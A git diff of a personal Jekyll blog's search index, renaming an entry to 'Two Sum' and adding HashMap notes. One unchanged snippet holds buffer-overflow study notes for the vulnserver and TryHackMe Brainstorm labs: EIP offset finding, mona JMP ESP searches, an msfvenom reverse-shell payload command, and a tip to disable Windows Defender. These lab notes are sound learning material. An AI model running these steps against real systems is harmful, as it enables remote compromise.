@@ -1,10 +1,10 @@
 [
   
   {
-    "title": "How to write a post",
+    "title": "Two Sum",
     "url": "/posts/Write-A-Post/",
     "categories": "dev",
-    "tags": "jekyll, git",
+    "tags": "leetcode, java, python",
     "date": "2022-03-27 11:33:00 +0800",
     
 
@@ -12,7 +12,7 @@
 
 
 
-    "snippet": "How to write a postSteps:  Create post(s) at zenbro.github.io/_posts  git clone https://github.com/YuchaoZheng88/zenbro.github.io.git  cd zenbro.github.io  git submodule init  git submodule update  cd YuchaoZheng88.github.io/  git checkout main  cd ..  bundle update  jekyll build -d YuchaoZheng88.github.io  cd YuchaoZheng88.github.io/  push the YuchaoZheng88.github.io submodule  cd ..  push the zenbro.github.io moduleeasy way:#! /bin/bashgit clone https://github.com/YuchaoZheng88/zenbro.github.io.gitcd zenbro.github.iogit submodule initgit submodule updatecd YuchaoZheng88.github.io/git checkout maincd ..bundle updatejekyll build -d YuchaoZheng88.github.iocd YuchaoZheng88.github.io/"
+    "snippet": "LinkJAVA HashMap    Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();    map.containskey(), map.get(),Python HashMap  https://docs.python.org/3/tutorial/datastructures.html#dictionaries"
   },
   
   {
@@ -28,6 +28,21 @@
 
 
     "snippet": "Learn from Videounderstand stack MOST IMPORTANT !!!What happens when you call a procedure?  https://www.youtube.com/watch?v=RU5vUIl1vRsAssembly Programming Assembly Function Stack Frame Explained  https://www.youtube.com/watch?v=vcfQVwtoyHY{low}ESP points to the top of the stack, at lower memory location.{buffer}EBP points to higher memory address, at the bottom of the stack, EIP holds the address of next instruction to be executed.{high}(one function on stack)lower addressat ESP value (Extended Stack Pointer)this Buffer Spaceat EBP value (Extended Base Pointer)at EIP value (Extended Instruction Pointer) / Return Addressshellcode start pointhigher addressThe process:  ESP hit command to get input, and the input change the stack value. EBP right, know next is EIP, EIP right. Value in stack wrong.  when ESP hit where EBP saves(on stack), the EBP value will change(or not). EBP wrong, EIP right.  when ESP hit where EIP saves(on stack), the EIP value will change.(to an address with value “JMP ESP”)  then ESP value increase. (so its meaningfull when we jump back, to the payloads.)  EIP do JMP ESP (JMP back to where the ESP is now pointing.)  EIP do the payload commands line by line.(one program in memory)(EIP start from TEXT, when meet a function, point to STACK return address))lower addressTEXTDATAHEAPSTACKhigher addressRET instruction:  This will take a dword from the top of the stack at esp and load it to eip,  while also adding 4 to esp’s value (to move it up to the next entry)Another way(not JMP ESP):  PUSH ESP, RET  https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret/Cyber Mentor BOF video and his recommendation  https://www.youtube.com/watch?v=ncBblM920jw  https://github.com/johnjhacking/Buffer-Overflow-Guide  https://tcm-sec.com/buffer-overflows-made-easy/Practice by vulnserver and Immunity Debuggervulnserver  https://thegreycorner.com/vulnserver.htmlif Windows block the download, turn off Windows Defender.Immunity Debugger  https://www.immunityinc.com/products/debugger/Cyber Mentor BOF process:  Spiking  Fuzzing  Finding the Offset  Overwriting the EIP  Finding Bad Characters  Finding the Right Module  Generating Shellcode  Rootnc -nv 192.168.1.90 9999connect to vuln servercommand, STATS [stat_value]1. Spikinggeneric_send_tcpapt-get install spike  ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR  ./generic_send_tcp 192.168.1.100 701 something.spk 0 02. FuzzingSend different characters try to break the program to find the offset/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F43373. Finding the Offsetfind EIP at 20034. Overwriting the EIP  EIP is 4 bytes. (32-bits)  Shellcode = “A” * 2003 + “B” * 4  check if B start at EIP.  HEX 41: A.   HEX 42: B.  EIP = “42424242” will be successful.5. Finding Bad Characters  google: “badchars”  !mona bytearray -cpb “\\x00”6. Finding the Right ModuleFind DLL without memory protection.  search mona.py, save to /Immunity Debugger/ PyCommands.Get JMP ESP shell code# locate nasm_shell# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb──(root💀kali)-[/home/kali]└─# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rbCalling `DidYouMean::SPELL_CHECKERS.merge!(error_name =&gt; spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.nasm &gt; JMP ESP00000000  FFE4              jmp espin mona, search JMP ESP location!mona modules!mona find -s \\xff\\xe4\" -m essfunc.dllanotherway: !mona jmp -r ESP -m “essfunc.dll”this module has no memory protections7. Generating Shellcodemsfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={Port} EXITFUNC=thread -f c -a x86 -b “\\00”in python3:put ‘b’ before shell code, means byte encode.THM Brain storm boxnmap -T4 -p- -Pn 10.10.131.179get: 21, 3389, 9999~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ftp 10.10.131.179name: anonymousftp&gt; lschatserver.exeessfun.dllftp&gt; prompt OFFftp&gt; binaryfor safe transfer, byte may crashftp&gt; mget *ftp&gt; bye~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~in Windowsdefender offfirewall off\\r = CR (Carriage Return) → Used as a new line character in Mac OS before X\\n = LF (Line Feed) → Used as a new line character in Unix/Mac OS X\\r\\n = CR + LF → Used as a new line character in Windows"
+  },
+  
+  {
+    "title": "How to write a post",
+    "url": "/posts/Write-A-Post/",
+    "categories": "dev",
+    "tags": "jekyll, git",
+    "date": "2022-03-27 11:33:00 +0800",
+    
+
+
+
+
+
+    "snippet": "How to write a postSteps:  Create post(s) with .md format at zenbro.github.io/_posts  Run the bash     #! /bin/bash git clone https://github.com/YuchaoZheng88/zenbro.github.io.git cd zenbro.github.io git submodule init git submodule update cd YuchaoZheng88.github.io/ git checkout main cd .. bundle update jekyll build -d YuchaoZheng88.github.io cd YuchaoZheng88.github.io/        push YuchaoZheng88.github.io, then push main zenbro.github.io"
   },
   
   {
